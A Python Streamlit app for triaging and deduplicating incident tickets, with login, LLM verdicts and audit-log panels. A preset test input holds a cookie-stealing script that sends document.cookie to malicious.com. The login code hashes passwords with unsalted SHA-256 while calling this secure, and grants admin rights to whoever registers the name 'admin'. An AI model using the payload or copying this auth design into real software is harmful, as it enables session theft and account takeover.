import streamlit as st
import pandas as pd
import os
import sqlite3
import hashlib
import plotly.express as px
from datetime import datetime
from src.processor import TicketProcessor
from src.llm_helper import LLMDeduplicatorHelper
from src.cache import RedisSimulationCache

# Configure page layout and security headers
st.set_page_config(
    page_title="DedupeAI Enterprise Console", 
    layout="wide",
    initial_sidebar_state="expanded"
)

# Premium UI Dark Mode Styling Injector
st.markdown("""
    <style>
        .main { background-color: #0e1117; }
        .metric-card {
            background-color: #1f2937;
            border: 1px solid #374151;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
        }
        .stTextArea textarea {
            background-color: #111827 !important;
            color: #f3f4f6 !important;
            border: 1px solid #4b5563 !important;
            font-family: monospace;
        }
        div[data-testid="stNotification"] {
            border-radius: 8px !important;
        }
    </style>
""", unsafe_allow_html=True)

# Initialize shared infrastructure components inside state memory
if "processor" not in st.session_state:
    st.session_state.processor = TicketProcessor()
if "ai_helper" not in st.session_state:
    st.session_state.ai_helper = LLMDeduplicatorHelper()
if "redis_cache" not in st.session_state:
    st.session_state.redis_cache = RedisSimulationCache(ttl_seconds=30)
if "authenticated_user" not in st.session_state:
    st.session_state.authenticated_user = None

proc = st.session_state.processor
ai_helper = st.session_state.ai_helper
cache = st.session_state.redis_cache

# Ensure relational database baseline is fully seeded
proc.seed_historical_baseline()

def setup_auth_tables():
    """Creates user storage infrastructure safely encrypted in SQLite."""
    conn = sqlite3.connect(proc.db_path)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS portal_users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            account_created TEXT
        )
    """)
    conn.commit()
    conn.close()

def hash_password(password_string):
    """Encodes plaintext into secure cryptographic representations [backend_Securities: Password Hashing]."""
    return hashlib.sha256(password_string.encode('utf-8')).hexdigest()

setup_auth_tables()

# ==================================================================================================
# SCREEN GATE 1: UNAUTHENTICATED LOGIN / SIGNUP ACCESS
# ==================================================================================================
if st.session_state.authenticated_user is None:
    st.markdown("<h1 style='text-align: center; color: #ff4b4b;'>🔐 DedupeAI Enterprise Gateway</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #9ca3af;'>Secure High-Throughput Perimeter Gate for Microservice Support Architectures</p>", unsafe_allow_html=True)
    
    col_l, col_m, col_r = st.columns([1, 2, 1])
    with col_m:
        auth_box = st.container(border=True)
        with auth_box:
            auth_tab1, auth_tab2 = st.tabs(["🔒 Secure Login", "📝 Create Free Account"])
            
            with auth_tab1:
                login_username = st.text_input("Username", key="login_user_field")
                login_password = st.text_input("Password", type="password", key="login_pass_field")
                
                if st.button("Authenticate Session", type="primary", use_container_width=True):
                    conn = sqlite3.connect(proc.db_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT password_hash FROM portal_users WHERE username = ?", (login_username.strip(),))
                    record = cursor.fetchone()
                    conn.close()
                    
                    if record and record[0] == hash_password(login_password):
                        st.session_state.authenticated_user = login_username.strip()
                        proc.log_security_event("USER_AUTHENTICATION", "SUCCESS", {"user": login_username.strip()})
                        st.success("Session verified! Loading cockpit configuration dashboard...")
                        st.rerun()
                    else:
                        st.error("Invalid access credentials provided. Entry denied.")
                        proc.log_security_event("USER_AUTHENTICATION_ATTEMPT", "FAILED", {"attempted_user": login_username})
                        
            with auth_tab2:
                reg_username = st.text_input("Choose Unique Username", key="reg_user_field")
                reg_password = st.text_input("Choose Strong Password", type="password", key="reg_pass_field")
                confirm_password = st.text_input("Confirm Your Password", type="password", key="reg_confirm_field")
                
                if st.button("Create Corporate Account", use_container_width=True):
                    if not reg_username.strip() or not reg_password.strip():
                        st.warning("Credential fields cannot be processed blank.")
                    elif reg_password != confirm_password:
                        st.error("Password string verification fields do not match.")
                    else:
                        try:
                            conn = sqlite3.connect(proc.db_path)
                            cursor = conn.cursor()
                            encrypted_pass = hash_password(reg_password)
                            cursor.execute("INSERT INTO portal_users VALUES (?, ?, ?)", (reg_username.strip(), encrypted_pass, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                            conn.commit()
                            conn.close()
                            
                            st.success("Account successfully provisioned! Please switch to Login tab.")
                            proc.log_security_event("ACCOUNT_PROVISIONING", "SUCCESS", {"new_user": reg_username.strip()})
                        except sqlite3.IntegrityError:
                            st.error("That username identifier is already registered.")

# ==================================================================================================
# SCREEN GATE 2: AUTHENTICATED USER — ACCESS GRANTED TO SERVICE WORKSPACE
# ==================================================================================================
else:
    # Sidebar Profile Card Layout
    with st.sidebar:
        st.markdown(f"### 🛡️ Core Controller Panel")
        st.markdown(f"👤 **Operator Profile:** `{st.session_state.authenticated_user}`")
        st.markdown("---")
        if st.button("Logout & Clear Session", type="secondary", use_container_width=True):
            proc.log_security_event("USER_LOGOUT", "SUCCESS", {"user": st.session_state.authenticated_user})
            st.session_state.authenticated_user = None
            st.rerun()

    # Main Application Header
    st.markdown("<h1 style='color: #00f2fe;'>🛡️ DedupeAI — Enterprise Security Cockpit</h1>", unsafe_allow_html=True)
    
    # Premium KPI Metrics Bar Layout
    try:
        conn = sqlite3.connect(proc.db_path)
        total_tickets = conn.execute("SELECT COUNT(*) FROM historical_tickets").fetchone()[0]
        total_audits = conn.execute("SELECT COUNT(*) FROM security_audit_logs").fetchone()[0]
        conn.close()
    except:
        total_tickets, total_audits = 0, 0

    m_col1, m_col2, m_col3, m_col4 = st.columns(4)
    with m_col1:
        st.markdown(f"<div class='metric-card'><span style='color:#9ca3af; font-size:14px;'>🗄️ Relational Knowledge Base</span><br><b style='font-size:24px; color:#3b82f6;'>{total_tickets} Items</b></div>", unsafe_allow_html=True)
    with m_col2:
        st.markdown(f"<div class='metric-card'><span style='color:#9ca3af; font-size:14px;'>📋 Immutable Security Audits</span><br><b style='font-size:24px; color:#10b981;'>{total_audits} Logs</b></div>", unsafe_allow_html=True)
    with m_col3:
        st.markdown(f"<div class='metric-card'><span style='color:#9ca3af; font-size:14px;'>⚡ Edge Cache Status</span><br><b style='font-size:24px; color:#f59e0b;'>Active (30s TTL)</b></div>", unsafe_allow_html=True)
    with m_col4:
        st.markdown(f"<div class='metric-card'><span style='color:#9ca3af; font-size:14px;'>🔐 System State Shield</span><br><b style='font-size:24px; color:#ef4444;'>Enabled (RBAC)</b></div>", unsafe_allow_html=True)

    st.markdown("<br>", unsafe_allow_html=True)

    # Split View Splitter
    col_left, col_right = st.columns([2, 3])

    with col_left:
        st.subheader("📥 Data Intake Console")
        
        st.markdown("**Incident Inject Simulation Presets:**")
        b1, b2, b3 = st.columns(3)
        preset_text = ""
        with b1:
            if st.button("Database Pool Fault", use_container_width=True):
                preset_text = "FATAL ERROR: Remaining connection slots are fully exhausted for active production superusers. Latency spike."
        with b2:
            if st.button("XSS Script Inject", use_container_width=True):
                preset_text = "<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script> UI login routing error."
        with b3:
            if st.button("Leaked Config Key", use_container_width=True):
                preset_text = "Worker node daemon crash reporting trace authentication failure using master secret: ACCESS_TOKEN=AIzaSyB9X8Y7Z6W5"

        input_text = st.text_area(
            "Paste System Error Log / Incident Ticket String:",
            value=preset_text if preset_text else "",
            height=200,
            placeholder="Logs pasted here are automatically audited for malicious script injection and hidden text credentials..."
        )
        
        fire_triage = st.button("Execute Secure Triage Loop", type="primary", use_container_width=True)

    with col_right:
        st.subheader("📊 Operational Analytics & Verdict Workbench")
        
        if fire_triage and input_text.strip():
            try:
                cleaned_input = proc.sanitize_and_mask_input(input_text)
                
                with st.expander("🔒 Review Sanitized Ingestion Stream", expanded=True):
                    st.code(cleaned_input, language="text")
                
                cache_key = f"verdict:{hash(cleaned_input)}"
                cached_verdict = cache.get(cache_key)
                
                if cached_verdict:
                    ai_verdict = cached_verdict
                    st.toast("⚡ Cache Perimeter Hit!", icon="⚡")
                    proc.log_security_event("CACHE_PERIMETER_HIT", "SUCCESS", {"key": cache_key})
                else:
                    matches = proc.find_top_matches(cleaned_input, top_n=3)
                    ai_verdict = ai_helper.verify_duplicate_status(cleaned_input, matches)
                    cache.set(cache_key, ai_verdict)
                    proc.log_security_event("CACHE_PERIMETER_MISS", "PROCESSED", {"key": cache_key})

                is_dup = False
                for key in ["is_duplicate", "isDuplicate", "IS_DUPLICATE"]:
                    if key in ai_verdict:
                        is_dup = bool(ai_verdict[key])

                confidence = ai_verdict.get("confidence_percentage", 0)
                reasoning = ai_verdict.get("reasoning", "Analysis executed without code errors.")
                action = ai_verdict.get("recommended_action", "Review incident routing metrics.")
                target_id = ai_verdict.get("target_duplicate_id", None)

                # Upgraded Banner Design Layout Presentation
                if is_dup:
                    st.error(f"### 🚨 DUPLICATE DETECTED ({confidence}% Match)")
                    st.markdown(f"🎯 **Linked Precedent:** `{target_id}`")
                    st.markdown(f"⚡ **Recommended Step:** `{action}`")
                    st.info(f"📖 **AI Logic:** {reasoning}")
                    proc.log_security_event("INCIDENT_TRIAGE_VERDICT", "DUPLICATE_FOUND", {"linked_to": target_id, "by_user": st.session_state.authenticated_user})
                else:
                    st.success("### ✅ UNIQUE STANDALONE TICKET VERIFIED")
                    st.markdown(f"⚡ **Recommended Step:** `Assign to specialized department queue.`")
                    st.info(f"📖 **AI Logic:** {reasoning}")
                    
                    new_id = f"TS-DYN-{int(datetime.now().timestamp())}"
                    try:
                        conn = sqlite3.connect(proc.db_path)
                        cursor = conn.cursor()
                        cursor.execute("INSERT INTO historical_tickets VALUES (?, ?, ?, ?, ?)", (new_id, "Application", cleaned_input[:40] + "...", cleaned_input, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                        conn.commit()
                        conn.close()
                        proc.log_security_event("DATABASE_DYNAMIC_LEARN", "SUCCESS", {"inserted_id": new_id, "by_user": st.session_state.authenticated_user})
                    except Exception:
                        pass

                fresh_matches = proc.find_top_matches(cleaned_input, top_n=3)
                if fresh_matches:
                    st.markdown("---")
                    chart_df = pd.DataFrame(fresh_matches)
                    fig = px.bar(
                        chart_df,
                        x="similarity_score",
                        y="ticket_id",
                        orientation="h",
                        color="similarity_score",
                        color_continuous_scale="Viridis",
                        labels={"similarity_score": "Cosine Coefficient Match", "ticket_id": "Row ID"}
                    )
                    fig.update_layout(height=180, margin=dict(l=10, r=10, t=10, b=10), template="plotly_dark")
                    st.plotly_chart(fig, use_container_width=True)

            except Exception as system_fault:
                st.error("⚠️ An internal infrastructure exception occurred while triaging this log record. Stack trace details have been shielded.")
                proc.log_security_event("SYSTEM_CORE_ERROR", "FAILURE", {"details": str(system_fault)})

        elif fire_triage:
            st.warning("Please specify a non-empty string payload.")
        else:
            st.caption("Operational cockpit status: Idle. Trigger an inspection preset above to launch.")
# ==================================================================================================
    # BOTTOM TIERS: DYNAMIC AUDITING PANELS & ROLE-BASED VISIBILITY [backend_Securities: Privacy Gate]
    # ==================================================================================================
    st.markdown("---")
    OWNER_ADMIN_USERNAME = "admin"
    
    if st.session_state.authenticated_user == OWNER_ADMIN_USERNAME:
        st.markdown("<h3 style='color: #f59e0b;'>🔑 Secure Owner Admin Cockpit</h3>", unsafe_allow_html=True)
        admin_col1, admin_col2 = st.columns(2)
        
        with admin_col1:
            st.markdown("📋 **Operational Security Audit Stream (Full Owner View)**")
            audit_logs_df = proc.fetch_audit_logs()
            if not audit_logs_df.empty:
                # The owner can see EVERYTHING, including full metadata summaries
                st.dataframe(audit_logs_df, use_container_width=True, hide_index=True)
            else:
                st.caption("No auditable transaction records currently logged.")
                
        with admin_col2:
            st.markdown("👥 **Registered Accounts User Directory (Live Storage)**")
            try:
                users_df = proc.fetch_registered_users()
                if not users_df.empty:
                    st.dataframe(users_df, use_container_width=True, hide_index=True)
                else:
                    st.caption("No users currently registered inside the database framework.")
            except Exception as e:
                st.caption(f"User directory sync lag: {str(e)}")
                
    else:
        # Standard User View: Securely hide other users' identities from leaking [backend_Securities: Masking]
        st.markdown("### 📋 Operational Security Audit Stream")
        audit_logs_df = proc.fetch_audit_logs()
        if not audit_logs_df.empty:
            # Drop the sensitive metadata summary column completely so regular users can't spy on other account actions
            filtered_audit_df = audit_logs_df.drop(columns=['metadata_summary'], errors='ignore')
            st.dataframe(filtered_audit_df, use_container_width=True, hide_index=True)
        else:
            st.caption("No auditable transaction records currently found.")